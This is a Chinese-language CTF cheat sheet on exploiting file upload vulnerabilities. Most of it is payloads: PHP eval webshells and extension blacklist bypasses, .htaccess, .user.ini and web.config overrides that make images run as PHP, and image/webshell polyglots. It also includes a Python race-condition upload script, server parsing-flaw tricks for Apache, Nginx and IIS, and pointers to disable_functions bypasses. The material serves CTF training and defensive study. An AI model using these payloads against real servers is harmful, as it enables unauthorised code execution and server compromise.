# 文件上传漏洞

## 1. 概述
文件上传漏洞允许攻击者上传恶意文件到服务器，最终实现代码执行。CTF中文件上传的考察点在于多层次的绕过检测，包括前端、后端白/黑名单、内容检测、存储路径控制等。

**核心目标：**
- 上传WebShell并执行（PHP/ASP/JSP等）
- 覆盖关键配置文件（`.htaccess`/`web.config`找）
- 条件竞争写入WebShell

## 2. 核心原理

服务端文件上传的防御层（由外到内）：
1. **前端JS校验** — 浏览器端过滤（可绕过）
2. **Content-Type校验** — Header检查（可伪造）
3. **扩展名黑/白名单** — 文件名后缀检查
4. **文件内容检测** — 文件头magic bytes / getimagesize()
5. **存储路径** — 上传目录是否可执行脚本
6. **权限设置** — 文件执行权限/访问控制

攻击者需逐层突破。

## 3. 关键技巧与Payload

### 3.1 前端JS绕过
```javascript
// 方法1：禁用JS（浏览器设置或插件）
// 方法2：BurpSuite拦截修改响应删除校验代码
// 方法3：F12控制台删除onSubmit事件
// 方法4：直接构造HTTP请求
```

**Burp修改包：**
```

Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php @eval($_POST[1]);?>

```

### 3.2 Content-Type绕过
将`Content-Type`更改为白名单类型：
```
Content-Type: image/gif
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: application/octet-stream
```

### 3.3 扩展名绕过黑名单

**后缀黑名单绕过全集：**
```php
# PHP可执行后缀（取决于服务器配置）
shell.php       # .php (最基础，通常被禁)
shell.php3      # .php3
shell.php4      # .php4
shell.php5      # .php5
shell.phtml     # .phtml
shell.pht       # .pht
shell.phar      # .phar
shell.php7      # .php7
shell.php8      # .php8

# 大小写绕过
shell.PHP
shell.Php
shell.PHp5

# 双写绕过（str_replace只替换一次）
shell.pphphp   → 去除php后 → shell.php

# 空格绕过（Windows特点）
shell.php       # 文件名末尾空格，Windows自动去除
shell.php.      # 文件名末尾点号
shell.php::$DATA  # Windows NTFS流

# 点号+空格组合
shell.php .
shell.php. .
shell.php::$DATA.

# 特殊字符截断（PHP < 5.3.4, magic_quotes_gpc=off）
shell.php%00.jpg   # %00截断
shell.php%00.txt

# .htaccess覆盖（Apache）
# 上传 .htaccess 文件内容：
AddType application/x-httpd-php .jpg
# 然后上传 shell.jpg，其内容被当作PHP执行

# .htaccess 更多招式：
<FilesMatch "shell.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>

# .user.ini (Nginx + PHP-FPM / Apache 2.3+)
# 上传 .user.ini：
auto_prepend_file=shell.jpg
# 或
auto_append_file=shell.jpg

# web.config绕过（IIS）
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <add name="php_shell" path="*.jpg" verb="*" modules="FastCgiModule" 
                 scriptProcessor="C:\php\php-cgi.exe" resourceType="Either" />
        </handlers>
    </system.webServer>
</configuration>

# Apache .conf覆盖（2.4+ 但需权限）
<Directory "/var/www/html/uploads">
    AllowOverride All
</Directory>
```

### 3.4 文件内容检测绕过

**Magic Bytes绕过：**
```bash
# PHP Shell 添加文件头
GIF89a<?php @eval($_POST[1]);?>

# PNG 头
# 使用copy /b合并（Windows）
copy /b 1.png + shell.php webshell.png.php

# Linux
cat 1.png shell.php > shell.png.php

# JPG 头
# 将shell插入JPG的EXIF数据中（保留.jpg后缀+服务器解析漏洞）
exiftool -Comment='<?php @eval($_POST[1]);?>' image.jpg

# 用echo构造
echo "GIF89a<?php @eval(\$_POST[1]);?>" > shell.gif.php
```

**getimagesize()绕过：**
```php
# 需要完整图片结构，用php在真实图片尾追加
<?php
// 读真实图片内容，后面添shell代码
$img = file_get_contents('real.png');
$img .= '<?php @eval($_POST[1]);?>';
file_put_contents('shell.png.php', $img);
?>
```

**二次渲染绕过：**
某些服务端用`imagecreatefromjpeg()`等GD库渲染后再保存，会清除图片中的PHP代码：
```php
# 绕过方法：PHP代码插入到图片颜色表或注释区（不会被渲染改变的位置）
# 工具1：GIF绕过 → 在GIF帧间隙插入代码
# 工具2：PNG IDAT chunk插入
# 工具3：JPG COM(0xFE) 注释段插入
```

**不使用图片函数的方式：**
```
# 如果只检测文件头不调用getimagesize()
GIF89a
<?php system('cat /flag');?>
```

### 3.5 条件竞争上传

**原理：** 文件先上传到临时目录，再检查。在检查到删除之间有时间窗口，可并发请求触发执行。

**攻击方法：**
```python
import threading, requests

url_upload = "http://target.com/upload.php"
url_shell = "http://target.com/uploads/shell.php"

def upload():
    while True:
        files = {'file': ('shell.php', '<?php system("cat /flag"); ?>', 'image/jpeg')}
        r = requests.post(url_upload, files=files)

def execute():
    while True:
        r = requests.get(url_shell)
        if r.status_code == 200 and 'flag' in r.text:
            print(r.text)
            break

# 多线程并发
threading.Thread(target=upload).start()
threading.Thread(target=execute).start()
```

**另一种条件竞争：** 移动文件 vs 包含文件（include）的竞争。

### 3.8 解析漏洞利用

**Apache解析漏洞：**
```
# 从右往左解析，直到碰见已知后缀
shell.php.xxx.yyy.zzz → 当xxx/yyy/zzz无法解析时，最终按php解析
# 利用条件：Apache httpd.conf 配置不当
```

**Nginx解析漏洞：**
```
# Nginx + PHP fastcgi
/test.jpg/test.php → 当test.jpg不存在时向前解析
/tmp/shell.jpg → nginx把图片当php执行

# 利用：上传shell.jpg → 访问 /uploads/shell.jpg/x.php
# 条件：cgi.fix_pathinfo=1（PHP默认开启）
```

**IIS解析漏洞：**
```
# IIS 6.0
shell.asp;.jpg   # 分号后被截断
shell.asp/1.jpg  # 目录型解析

# IIS 7.0/7.5 + PHP
shell.jpg/.php → 被当PHP执行
# 条件：cgi.fix_pathinfo=1
```

## 4. 常见误区与注意事项
1. **phpinfo很重要**：先确认目标PHP版本、`disable_functions`、`open_basedir`等，这些决定WebShell能做什么。
2. **PHTML等后缀需要Apache支持**：`AddType application/x-httpd-php .phtml` 不在默认配置，所以`.phtml`不一定能解析。
3. **.htaccess的覆盖条件**：`AllowOverride All` 必须在Apache配置中明确开启，默认可能是`None`。
4. **.user.ini需要脚本文件触发**：空目录里放`.user.ini`+`.jpg`不能执行，必须有至少一个`.php`文件被访问。
5. **NTFS流绕过只存在于Windows服务器**：`::$DATA` 是NTFS特性，Linux无效。
6. **%00截断依赖PHP版本**：PHP 5.3.4+ 已修复`%00`截断。
7. **二次渲染**：不仅代码被清除，甚至图片尺寸/颜色都可能变化，GD库和ImageMagick行为不同。
8. **文件权限**：Linux下上传后文件可能没有执行权限，WebShell虽然成功写入但不能执行`system()`。
9. **disable_functions突破**：可通过`putenv()` + `LD_PRELOAD`、`mail()` + `sendmail`、`ImageMagick`delegate、PHP-FPM未授权、PHP GC UAF、iconv漏洞等绕过。
10. **offline策略**：收集各版本`.htaccess`/`.user.ini`模板；准备各种PHP版本+各种disable_functions的突破工具链。

## 5. 实战示例

### 示例1：多阶段绕过上传WebShell
```
场景：
  - 前端JS限制必须图片格式
  - 后端黑名单: php, php3, php4, php5, phtml, pht
  - Content-Type校验: image/png
  - 调用getimagesize()验证

绕过步骤：
  1. 删掉前端JS或Burp拦截修改
  2. Content-Type改为 image/png
  3. 文件名用 shell.phar（不在黑名单内，但Apache默认能解析）
  4. 内容添加PNG文件头 + shell代码
  5. 访问 /uploads/shell.phar
```

### 示例2：.user.ini + 图片木马组合
```
上传1：.user.ini
内容：
GIF89a
auto_prepend_file=shell.gif

上传2：shell.gif
内容：
GIF89a<?php @eval($_POST[1]);?>

访问 /uploads/index.php?id=123 → 自动包含shell.gif代码
用蚁剑连接 /uploads/index.php 密码 1
```
